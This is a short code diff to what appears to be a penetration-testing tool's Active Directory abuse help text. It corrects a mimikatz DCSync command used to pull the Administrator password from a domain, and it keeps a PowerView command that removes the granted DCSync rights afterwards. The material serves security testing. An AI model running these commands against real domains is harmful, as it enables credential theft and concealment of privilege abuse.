@@ -225,7 +225,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         
         Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain
 
-        <code>sekurlsa::dcsync /domain:testlab.local /user:Administrator</code>
+        <code>lsadump::dcsync /domain:testlab.local /user:Administrator</code>
         
         Cleanup can be done using the Remove-DomainObjectAcl function:
         <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync</code>`;
